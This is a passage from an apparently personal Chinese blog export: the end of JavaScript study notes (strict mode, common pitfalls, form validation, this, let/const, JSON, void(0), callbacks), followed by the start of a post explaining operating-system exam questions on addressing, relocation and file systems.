<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="variable language_">this</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 返回false，因为&quot;this&quot;指向全局对象，&quot;!this&quot;就是false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123; </span><br><span class="line">    <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> !<span class="variable language_">this</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 返回true，因为严格模式下，this的值为undefined，所以&quot;!this&quot;为true。</span></span><br></pre></td></tr></table></figure>
<p>因此，使用构造函数时，如果忘了加new，this不再指向全局对象，而是报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">a</span> = <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">f</span>();<span class="comment">// 报错，this未定义</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>注意：”use strict” 指令只允许出现在脚本或函数的开头</p>
<h1 id="使用误区"><a href="#使用误区" class="headerlink" title="使用误区"></a>使用误区</h1><h2 id="比较运算符常见错误"><a href="#比较运算符常见错误" class="headerlink" title="比较运算符常见错误"></a>比较运算符常见错误</h2><p>switch 语句会使用恒等计算符(&#x3D;&#x3D;&#x3D;)进行比较<br>以下实例由于类型不一致不会执行 alert 弹窗：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">switch</span>(x) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;10&quot;</span>: <span class="title function_">alert</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="浮点型数据使用注意事项"><a href="#浮点型数据使用注意事项" class="headerlink" title="浮点型数据使用注意事项"></a>浮点型数据使用注意事项</h2><p>JavaScript 中的所有数据都是以 64 位<strong>浮点型数据(float)</strong> 来存储。<br>所有的编程语言，包括 JavaScript，对浮点型数据的精确度都很难确定</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">0.1</span>;</span><br><span class="line"><span class="keyword">var</span> y = <span class="number">0.2</span>;</span><br><span class="line"><span class="keyword">var</span> z = x + y            <span class="comment">// z 的结果为 0.30000000000000004</span></span><br><span class="line"><span class="keyword">if</span> (z == <span class="number">0.3</span>)            <span class="comment">// 返回 false</span></span><br></pre></td></tr></table></figure>
<p>为解决以上问题，可以用整数的乘除法来解决：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> z = (x * <span class="number">10</span> + y * <span class="number">10</span>) / <span class="number">10</span>;       <span class="comment">// z 的结果为 0.3</span></span><br></pre></td></tr></table></figure>

<h2 id="JavaScript-字符串分行"><a href="#JavaScript-字符串分行" class="headerlink" title="JavaScript 字符串分行"></a>JavaScript 字符串分行</h2><p>JavaScript 允许我们在字符串中使用断行语句:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x =</span><br><span class="line"><span class="string">&quot;Hello World!&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>但是，在字符串中直接使用回车换行是会报错的,字符串断行需要使用反斜杠()，如下所示:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="string">&quot;Hello \</span></span><br><span class="line"><span class="string">World!&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>注意：不用对 return 语句进行断行。</p>
<h2 id="数组中使用名字来索引"><a href="#数组中使用名字来索引" class="headerlink" title="数组中使用名字来索引"></a>数组中使用名字来索引</h2><p>许多程序语言都允许使用名字来作为数组的索引。<br>使用名字来作为索引的数组称为关联数组(或哈希)。<br>JavaScript 不支持使用名字来索引数组，只允许使用数字索引<br>在 JavaScript 中, 对象 使用 名字作为索引。<br>如果你使用名字作为索引，当访问数组时，JavaScript 会把数组重新定义为标准对象。<br>执行这样操作后，数组的方法及属性将不能再使用，否则会产生错误:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = [];</span><br><span class="line">person[<span class="string">&quot;firstName&quot;</span>] = <span class="string">&quot;John&quot;</span>;</span><br><span class="line">person[<span class="string">&quot;lastName&quot;</span>] = <span class="string">&quot;Doe&quot;</span>;</span><br><span class="line">person[<span class="string">&quot;age&quot;</span>] = <span class="number">46</span>;</span><br><span class="line"><span class="keyword">var</span> x = person.<span class="property">length</span>;         <span class="comment">// person.length 返回 0</span></span><br><span class="line"><span class="keyword">var</span> y = person[<span class="number">0</span>];             <span class="comment">// person[0] 返回 undefined</span></span><br></pre></td></tr></table></figure>

<h2 id="定义数组元素和对象，最后不能添加逗号"><a href="#定义数组元素和对象，最后不能添加逗号" class="headerlink" title="定义数组元素和对象，最后不能添加逗号"></a>定义数组元素和对象，最后不能添加逗号</h2><p>数组最后一个值的后面添加逗号虽然语法没有问题，但是在不同的浏览器可能得到不同的结果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> colors = [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>,]; <span class="comment">//这样数组的长度可能为3 也可能为4。</span></span><br></pre></td></tr></table></figure>

<h2 id="Undefined-不是-Null"><a href="#Undefined-不是-Null" class="headerlink" title="Undefined 不是 Null"></a>Undefined 不是 Null</h2><p>在 JavaScript 中, <strong>null</strong> 用于对象, <strong>undefined</strong> 用于变量，属性和方法。<br>对象只有被定义才有可能为 null，否则为 undefined。<br>如果我们想测试对象是否存在，在对象还没定义时将会抛出一个错误。<br>正确的方式是我们需要先使用 typeof 来检测对象是否已定义：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> myObj !== <span class="string">&quot;undefined&quot;</span> &amp;&amp; myObj !== <span class="literal">null</span>)</span><br></pre></td></tr></table></figure>

<h2 id="程序块作用域"><a href="#程序块作用域" class="headerlink" title="程序块作用域"></a>程序块作用域</h2><p>在每个代码块中 JavaScript 不会创建一个新的作用域，一般各个代码块的作用域都是全局的。</p>
<h1 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h1><h2 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h2><p>HTML 表单验证可以通过 JavaScript 来完成。<br>以下实例代码用于判断表单字段(fname)值是否存在， 如果不存在，就弹出信息，阻止表单提交：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">validateForm</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&quot;myForm&quot;</span>][<span class="string">&quot;fname&quot;</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="literal">null</span> || x == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;需要输入名字。&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上 JavaScript 代码可以通过 HTML 代码来调用：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;myForm&quot;</span> <span class="attr">action</span>=<span class="string">&quot;demo_form.php&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return validateForm()&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">名字: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fname&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>onsubmit&#x3D;”return validateForm()”</strong> 当验证不通过时，返回 false，可以阻止表单提交。</p>
<h2 id="HTML-表单自动验证"><a href="#HTML-表单自动验证" class="headerlink" title="HTML 表单自动验证"></a>HTML 表单自动验证</h2><p>HTML 表单验证也可以通过浏览器来自动完成。<br>如果表单字段 (fname) 的值为空, required 属性会阻止表单提交：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;demo_form.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fname&quot;</span> <span class="attr">required</span>=<span class="string">&quot;required&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="数据验证"><a href="#数据验证" class="headerlink" title="数据验证"></a>数据验证</h2><p><strong>服务端数据验证</strong>是在数据提交到服务器上后再验证。<br><strong>客户端数据验证</strong>是在数据发送到服务器前，在浏览器上完成验证。</p>
<h2 id="HTML-约束验证"><a href="#HTML-约束验证" class="headerlink" title="HTML 约束验证"></a>HTML 约束验证</h2><p>HTML5 新增了 HTML 表单的验证方式：约束验证（constraint validation）。<br>约束验证是表单被提交时浏览器用来实现验证的一种算法。<br>HTML 约束验证基于：</p>
<ul>
<li>HTML 输入属性</li>
<li>CSS 伪类选择器</li>
<li>DOM 属性和方法</li>
</ul>
<h3 id="约束验证-HTML-输入属性"><a href="#约束验证-HTML-输入属性" class="headerlink" title="约束验证 HTML 输入属性"></a>约束验证 HTML 输入属性</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">属性 		描述</span><br><span class="line">disabled	规定输入的元素不可用</span><br><span class="line">max			规定输入元素的最大值</span><br><span class="line">min  		规定输入元素的最小值</span><br><span class="line">pattern		规定输入元素值的模式</span><br><span class="line">required	归档输入元素字段是必需的</span><br><span class="line">type 		规定输入元素的类型</span><br></pre></td></tr></table></figure>
<h3 id="约束验证-CSS-伪类选择器"><a href="#约束验证-CSS-伪类选择器" class="headerlink" title="约束验证 CSS 伪类选择器"></a>约束验证 CSS 伪类选择器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">选择器  		描述</span><br><span class="line">:disabled	选取属性为“disabled”属性的input元素</span><br><span class="line">:invalid	选取无效的input元素</span><br><span class="line">:optional	选择没有“optional”属性的input元素</span><br><span class="line">:valid 		选择有效值的input元素</span><br></pre></td></tr></table></figure>


<h1 id="验证-API"><a href="#验证-API" class="headerlink" title="验证 API"></a>验证 API</h1><h2 id="约束验证-DOM-方法"><a href="#约束验证-DOM-方法" class="headerlink" title="约束验证 DOM 方法"></a>约束验证 DOM 方法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checkValidity()</span><br><span class="line">如果input元素中的数据是合法的返回true，否则返回false。HTMLSelectElement.checkValidity() 会检查元素是否有任何输入约束条件，并且检查值是否符合约束条件。 如果值是不符合约束条件的，浏览器就会在该元素上触发一个可以撤销的 invalid 事件。</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setCustomValidity()</span><br><span class="line">设置input元素的validationMessage属性，用于自定义错误提示信息的方法。使用setCustomValidity设置了自定义提示后，validity.customError就会变为true，checkValidity总是会返回false。如果要重新判断需要取消自定义提示，方式如下：</span><br><span class="line">setCustomValidity(&#x27;&#x27;)</span><br><span class="line">setCustomValidity(null)</span><br><span class="line">setCustomValidity(undefined)</span><br></pre></td></tr></table></figure>

<h2 id="约束验证-DOM-属性"><a href="#约束验证-DOM-属性" class="headerlink" title="约束验证 DOM 属性"></a>约束验证 DOM 属性</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">validity  			布尔属性值，返回input输入值是否合法</span><br><span class="line">validationMessage   浏览器错误提示信息</span><br><span class="line">willValidate		指定input是否需要验证</span><br></pre></td></tr></table></figure>

<h2 id="Validity-属性"><a href="#Validity-属性" class="headerlink" title="Validity 属性"></a>Validity 属性</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">customError		设置为 true, 如果设置了自定义的 validity 信息。</span><br><span class="line">patternMismatch	设置为 true, 如果元素的值不匹配它的模式属性。</span><br><span class="line">rangeOverflow	设置为 true, 如果元素的值大于设置的最大值。</span><br><span class="line">rangeUnderflow	设置为 true, 如果元素的值小于它的最小值。</span><br><span class="line">stepMismatch	设置为 true, 如果元素的值不是按照规定的 step 属性设置。</span><br><span class="line">tooLong			设置为 true, 如果元素的值超过了 maxLength 属性设置的长度。</span><br><span class="line">typeMismatch	设置为 true, 如果元素的值不是预期相匹配的类型。</span><br><span class="line">valueMissing	设置为 true，如果元素 (required 属性) 没有值。</span><br><span class="line">valid			设置为 true，如果元素的值是合法的。</span><br></pre></td></tr></table></figure>


<h1 id="this-关键字"><a href="#this-关键字" class="headerlink" title="this 关键字"></a>this 关键字</h1><p>面向对象语言中 this 表示当前对象的一个引用。<br>但在 JavaScript 中 this 不是固定不变的，它会随着执行环境的改变而改变。</p>
<ul>
<li>在方法中，this 表示该方法所属的对象。</li>
<li>如果单独使用，this 表示全局对象。在浏览器中，window 就是该全局对象为 [object Window]</li>
<li>在函数中，this 表示全局对象。</li>
<li>在函数中，在严格模式下，this 是未定义的(undefined)。</li>
<li>在事件中，this 表示接收事件的元素。</li>
<li>类似 call() 和 apply() 方法可以将 this 引用到任何对象。<br>在下面实例中，当我们使用 person2 作为参数来调用 person1.fullName 方法时, this 将指向 person2, 即便它是 person1 的方法：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">  <span class="attr">fullName</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&quot; &quot;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person2 = &#123;</span><br><span class="line">  <span class="attr">firstName</span>:<span class="string">&quot;John&quot;</span>,</span><br><span class="line">  <span class="attr">lastName</span>: <span class="string">&quot;Doe&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">person1.<span class="property">fullName</span>.<span class="title function_">call</span>(person2);  <span class="comment">// 返回 &quot;John Doe&quot;js</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="let-和-const"><a href="#let-和-const" class="headerlink" title="let 和 const"></a>let 和 const</h1><p>let 声明的变量只在 let 命令所在的代码块内有效。<br>const 声明一个只读的常量，一旦声明，常量的值就不能改变。</p>
<h2 id="JavaScript-块级作用域-Block-Scope"><a href="#JavaScript-块级作用域-Block-Scope" class="headerlink" title="JavaScript 块级作用域(Block Scope)"></a>JavaScript 块级作用域(Block Scope)</h2><p>使用 var 关键字声明的变量不具备块级作用域的特性，它在 {} 外依然能被访问到。<br>ES6 可以使用 let 关键字来实现块级作用域。<br>let 声明的变量只在 let 命令所在的代码块 {} 内有效，在 {} 之外不能访问。</p>
<h2 id="循环作用域"><a href="#循环作用域" class="headerlink" title="循环作用域"></a>循环作用域</h2><p>使用了 var 关键字，它声明的变量是全局的，包括循环体内与循环体外。<br>使用 let 关键字， 它声明的变量作用域只在循环体内，循环体外的变量不受影响。</p>
<h2 id="HTML-代码中使用全局变量"><a href="#HTML-代码中使用全局变量" class="headerlink" title="HTML 代码中使用全局变量"></a>HTML 代码中使用全局变量</h2><p>使用 <strong>var</strong> 关键字声明的全局作用域变量属于 window 对象,使用 <strong>var</strong> 关键字声明的变量在任何地方都可以修改,不能使用 <strong>var</strong> 关键字来重置 <strong>let</strong> 关键字声明的变量<br>使用 <strong>let</strong> 关键字声明的全局作用域变量不属于 window 对象,在相同的作用域或块级作用域中，不能使用 <strong>let</strong> 关键字来重置 <strong>var</strong> 关键字声明的变量,不能使用 <strong>let</strong> 关键字来重置 <strong>let</strong> 关键字声明的变量</p>
<h2 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h2><p>JavaScript 中，var 关键字定义的变量可以在使用后声明，也就是变量可以先使用再声明<br>let 和 const 关键字定义的变量则不可以在使用后声明，也就是变量需要先声明再使用。</p>
<h2 id="const-关键字"><a href="#const-关键字" class="headerlink" title="const 关键字"></a>const 关键字</h2><p>const 用于声明一个或多个常量，声明时必须进行初始化，且初始化后值不可再修改<br>const定义常量与使用let 定义的变量相似：</p>
<ul>
<li>二者都是块级作用域</li>
<li>都不能和它所在作用域内的其他变量或函数拥有相同的名称<br>两者还有以下两点区别：</li>
<li>const声明的常量必须初始化，而let声明的变量不用</li>
<li>const 定义常量的值不能通过再赋值修改，也不能再次声明。而 let 定义的变量值可以修改</li>
</ul>
<h3 id="并非真正的常量"><a href="#并非真正的常量" class="headerlink" title="并非真正的常量"></a>并非真正的常量</h3><p>const 的本质: const 定义的变量并非常量，并非不可变，它定义了一个常量引用一个值。使用 const 定义的对象或者数组，其实是可变的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建常量对象</span></span><br><span class="line"><span class="keyword">const</span> car = &#123;<span class="attr">type</span>:<span class="string">&quot;Fiat&quot;</span>, <span class="attr">model</span>:<span class="string">&quot;500&quot;</span>, <span class="attr">color</span>:<span class="string">&quot;white&quot;</span>&#125;;</span><br><span class="line"><span class="comment">// 修改属性:</span></span><br><span class="line">car.<span class="property">color</span> = <span class="string">&quot;red&quot;</span>;</span><br><span class="line"><span class="comment">// 添加属性</span></span><br><span class="line">car.<span class="property">owner</span> = <span class="string">&quot;Johnson&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>但是不能对常量对象或数组重新赋值。</p>
<h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><p>JSON 是用于存储和传输数据的格式。<br>JSON 通常用于服务端向网页传递数据。</p>
<h2 id="什么是-JSON"><a href="#什么是-JSON" class="headerlink" title="什么是 JSON?"></a>什么是 JSON?</h2><p>JSON 英文全称 JavaScript Object Notation<br>JSON 是一种轻量级的数据交换格式。<br>JSON是独立的语言（JSON 使用 JavaScript 语法，但是 JSON 格式仅仅是一个文本。文本可以被任何编程语言读取及作为数据格式传递。）<br>JSON 易于理解。<br>实例：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;sites&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Runoob&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;www.runoob.com&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Google&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;www.google.com&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Taobao&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;www.taobao.com&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="JSON-语法规则"><a href="#JSON-语法规则" class="headerlink" title="JSON 语法规则"></a>JSON 语法规则</h2><ul>
<li>数据为 键&#x2F;值 对</li>
<li>数据由逗号分隔</li>
<li>大括号保存对象</li>
<li>方括号保存数组</li>
</ul>
<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JSON.parse()		用于将一个JSON字符串转换为JavaScript对象</span><br><span class="line">JSON.stringify()	用于将JavaScript值转换为JSON字符串</span><br></pre></td></tr></table></figure>


<h1 id="javascript-void-0-含义"><a href="#javascript-void-0-含义" class="headerlink" title="javascript:void(0) 含义"></a>javascript:void(0) 含义</h1><figure class="highlight plaintext"><figcaption><span>中最关键的是void关键字，void是JavaScript中非常重要的关键字，该操作符指定要计算一个表达式但是不返回值。</span></figcaption><table><tr><td class="code"><pre><span class="line">语法格式如下：</span><br><span class="line">```js</span><br><span class="line">void func()</span><br><span class="line">javascript:void func()</span><br><span class="line">或</span><br><span class="line">void(func())</span><br><span class="line">javascript:void(func())</span><br></pre></td></tr></table></figure>
<p>下面的代码创建了一个超级链接，当用户点击以后不会发生任何事。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span>&gt;</span>单击此处什么也不会发生<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>以下实例中，在用户点击链接后显示警告信息：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>点击以下链接查看结果：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(alert(&#x27;Warning!!!&#x27;))&quot;</span>&gt;</span>点我!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="href-x3D-”-”与href-x3D-”javascript-void-0-”的区别"><a href="#href-x3D-”-”与href-x3D-”javascript-void-0-”的区别" class="headerlink" title="href&#x3D;”#”与href&#x3D;”javascript:void(0)”的区别"></a>href&#x3D;”#”与href&#x3D;”javascript:void(0)”的区别</h2><p># 包含了一个位置信息，默认的锚是#top 也就是网页的上端。<br>而javascript:void(0), 仅仅表示一个死链接。<br>在页面很长的时候会使用 # 来定位页面的具体位置，格式为：# + id。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0);&quot;</span>&gt;</span>点我没有反应的!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#pos&quot;</span>&gt;</span>点我定位到指定位置!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;pos&quot;</span>&gt;</span>尾部定位点<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="异步编程"><a href="#异步编程" class="headerlink" title="异步编程"></a>异步编程</h1><h2 id="异步的概念"><a href="#异步的概念" class="headerlink" title="异步的概念"></a>异步的概念</h2><p>异步（Asynchronous, async）是与同步（Synchronous, sync）相对的概念。<br>同步按照代码顺序执行，异步不按照代码顺序执行，异步的执行效率更高。<br>通俗地解释一下异步：异步就是从主线程发射一个子线程来完成任务。</p>
<h2 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h2><p>回调函数就是一个函数，它是在我们启动一个异步任务的时候就告诉它：等你完成了这个任务之后要干什么。这样一来主线程几乎不用关心异步任务的状态了，他自己会善始善终。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo1&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;RUNOOB-1!&quot;</span>;</span><br><span class="line">&#125;, <span class="number">3000</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo2&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;RUNOOB-2!&quot;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="异步-AJAX"><a href="#异步-AJAX" class="headerlink" title="异步 AJAX"></a>异步 AJAX</h2><p>除了 setTimeout 函数以外，异步回调广泛应用于 AJAX 编程。<br>XMLHttpRequest 常常用于请求来自远程服务器上的 XML 或 JSON 数据。一个标准的 XMLHttpRequest 对象往往包含多个回调</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>没写完，暂时不想写了。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.runoob.com/js/js-tutorial.html">JavaScript教程-runoob</a></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title>OS习题解析</title>
    <url>/2022/12/08/OS%E4%B9%A0%E9%A2%98%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为快到期末考试了，所以需要好好复习，争取考高分吧。</p>
<span id="more"></span>
<h1 id="习题解析"><a href="#习题解析" class="headerlink" title="习题解析"></a>习题解析</h1><ul>
<li>说明：</li>
</ul>
<ol>
<li>不是全部题，只写本人不会的以及需要思考的题。</li>
<li>选择题不写选项，因为懒</li>
<li>试卷来源于打印店</li>
</ol>
<h2 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h2><ol>
<li><p>若处理器有32位地址，则它的虚拟地址空间为（）字节。<br>解析：<br>虚拟地址对应于物理存储空间的大小，因而可以虚拟出看起来很大的内存空间，这里虚拟地址的地址结构是：<br>31—页号—12—位移量w—0,这里的地址长度正好是操作系统的内存位数，所以可以知道最大寻址为2的32次方b,对应于kb,mb,gb的换算式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2^10b = 1kb</span><br><span class="line">2^20b = 1mb = 1kb*2^10</span><br><span class="line">2^30b = 1gb = 1mb*2^10</span><br><span class="line">这里2^32 = 2^2*1gb  = 4gb</span><br><span class="line">答案：4GB，选B</span><br></pre></td></tr></table></figure>
</li>
<li><p>支持程序浮动的地址转换机制是（）<br>解析：<br>主存储器是可以被处理器直接访问的，处理器是按绝对地址访问主存储器的。<br>为了使用户编制的程序能存放在主存储器的任意区域执行，用户使用逻辑地址编辑程序，即用户使用了逻辑上的主存储器。存储管理必须为用户分配一个物理上的存储空间，于是，就有一个从逻辑空间到物理空间的转换问题。<br>具体地说，是要把逻辑地址转换成绝对地址，把这样的地址转换工作称为重定位。<br>重定位的方式可以有“静态重定位”和“动态重定位”。<br>静态重定位是指在装入一个作业时，把作业中的指令地址和数据地址全部转换成绝对地址。一旦装入则不能改变。<br>动态重定位是指在装入作业时，不进行地址转换，而是直接把作业装入到分配的主存区域中。在作业执行过程中，每当执行一条指令时都有硬件的地址转换机构将指令中的逻辑地址转换为绝对地址。<br>答案：动态重定位，选A</p>
</li>
<li><p>UNIX中的文件系统采用（）<br>解析：<br>按逻辑结构划分，Unix中的文件系统采用流式文件；而按物理结构划分，则是索引文件。<br>答案：流式文件，选D</p>
</li>
<li><p>段页式管理每取一数据，要访问（）次内存。<br>解析：<br>一般需要访问3次以上的内存：<br>第1次是由段表地址寄存器得段表始址后访问段表，由此取出对应段的页表在内存中的地址。<br>第2次则是访问页表得到所要访问的物理地址。<br>第3次才能访问真正需要访问的物理单元。<br>答案：3，选C</p>
</li>
<li><p>文件系统的主要目的是（）<br>解析：<br>文件系统是操作系统用来组织和管理存储设备或磁盘分区上的文件的数据结构和方法；即在存储设备上组织和 管理文件 的方法。 操作系统中负 责管理和存储文件信息的软件机构即为文件管理系统，简称为“文件系统”。文件系统主要由三部分组成：文件系统接口，对对象操纵还有管理的软件集合，对象及属性。<br>从操作系统的角度来看，文件系统是对文件存储设备的空间进行组织、分配，负责文件存储并且对存入的文件进行保护和检索的系统。<br>答案：实现对文件的按名存取，选A</p>
</li>
